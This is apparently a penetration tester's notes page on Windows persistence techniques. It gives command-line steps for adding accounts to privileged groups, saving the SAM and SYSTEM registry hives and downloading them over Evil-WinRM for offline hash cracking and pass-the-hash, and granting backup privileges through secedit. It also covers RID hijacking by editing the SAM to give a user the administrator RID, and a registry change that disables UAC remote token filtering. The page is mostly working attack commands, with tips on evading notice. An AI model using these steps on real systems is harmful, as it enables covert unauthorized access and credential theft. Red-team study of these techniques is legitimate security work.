# Windows Persistence

## Assign Group Memberships

### Add to Administrators group
Most straight forward way, but could be suspicious.

`C:\> net localgroup administrators <username> /add`

### Add to Backup Operators
Backup Operators have read/write for any file or registry key on the system and ignores any configured DACL.

Can use this to copy SAM and SYSTEM registry hives to crack hashes offline.

`C:\> net localgroup "Backup Operators" <username> /add`

Downside is that this account is unprivileged and cannot RDP or WinRM to the machine. We can add it to the **Remote Desktop Users** for RDP or **Remote Management Users** for WinRM

`C:\> net localgroup "Remote Desktop Users" <username> /add`

`C:\> net localgroup "Remote Management Users" <username> /add`

#### After Creation
After connecting to the host using Evil-WinRM with the Backup Operators account, we can use the following commands to grab SAM and SYSTEM files:

`*Evil-WinRM* PS C:\> reg save hklm\system system.bak`

`*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak`

`*Evil-WinRM* PS C:\> download system.bak`

`*Evil-WinRM* PS C:\> download sam.bak`

Then you can use [impacket](../../useful_tools/Linux/README.md#impacket---secretsdumppy) for cracking the hashes. Then perform a Pass-the-Hash attack using [evil-winrm](../../remote_connection/Windows/README.md#winrm)

## Special Privileges and Security Descriptors
### SeBackupPrivilege & SeRestorePrivilege
These two privileges are the ones used by Backup Operator accounts. We can give users those privileges doing the following:

`C:\> secedit /export /cfg config.inf`

This will create a `config.inf` file in the current directory. Open the file in notepad (or something similar) and scroll to the [Privilege Rights] section. There look for the two privileges and add the user you want at the end of the line `<line>,<username>`. Then run the following commands:

`C:\> secedit /import /cfg config.inf /db config.sbd`

`C:\> secedit /configure /db config.sbd /cfg config.inf`

### Security Descriptor
We will now need to allow our user to connect to WinRM. **You will need to have GUI access to the host for this step**.

`C:\> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`

You will then need to add the user you want and select the Full Control(All Operations) box.

[After Creation](#after-creation)

If someone was looking at the user using `net user <username>` this method will not show that it has any special group memberships!

## RID Hijacking
This has to be one of my favorite low level ways of persistence (I just think it is cool, I may learn something better later on)!

The default Administrator account is assigned the RID = 500, while regular users have an RID >= 1000. We can check to see the RIDs by using the following command:

`C:\> wmic useraccount get name,sid`

The RID is the last part of the SID. Write down the RID of the account you want to change.

**You will need to get [pstools](../../useful_tools/Windows/README.md#pstools) onto the host machine**

`C:\<location of pstools> > PsExec64.exe -i -s regedit`

This will open up regedit with a SYSTEM account that will allow us to change the SAM. Go to: `HKLM\SAM\SAM\Domains\Account\Users\`

We will need to look through the accounts under the variable name F at location 0x30. This is the little endian hex value of the RID for the account. So make sure to take the RID of the user you want to give admin rights to and convert to little endian hex. Once you found the user you will need to change the 4 bytes to 0x01F4, which is 500. Make sure to put it in little endian F4 01.

Next time you attempt to log in the system will grant you admin rights!

## Potential Fences

### UAC
Due to UAC (User Account Control) admin rights may be stripped upon remote connection. This is due to the LocalAccountTokenFilterPolicy registry value. We can change that using the following command:

`C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`

Where `/t` is the datatype, `/v` is the valuename, and `/d` is the data.